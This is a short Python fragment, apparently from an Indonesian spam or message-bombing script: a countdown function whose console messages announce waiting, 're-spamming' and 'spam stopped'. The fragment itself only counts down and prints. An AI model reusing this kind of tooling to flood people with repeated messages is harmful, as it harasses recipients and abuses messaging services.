def countdown(time_sec):
	try:
		while time_sec:
			mins, secs = divmod(time_sec,60)
			timeformat = '\033[1;97m[\033[1;93m•\033[1;97m] Silahkan Menunggu Dalam Waktu \033[1;92m{:02d}:{:02d}'.format(mins,secs)
			print(timeformat,end='\r')
			time.sleep(1)
			time_sec -= 1
			print (f"{W}[{Y}•{W}] Sedang Menyepam Ulang....           ")
			time.sleep(5)
	except KeyboardInterrupt:
		print (f"{W}Spam Di Hentikan [{R}!{W}]")
		sys.exit()


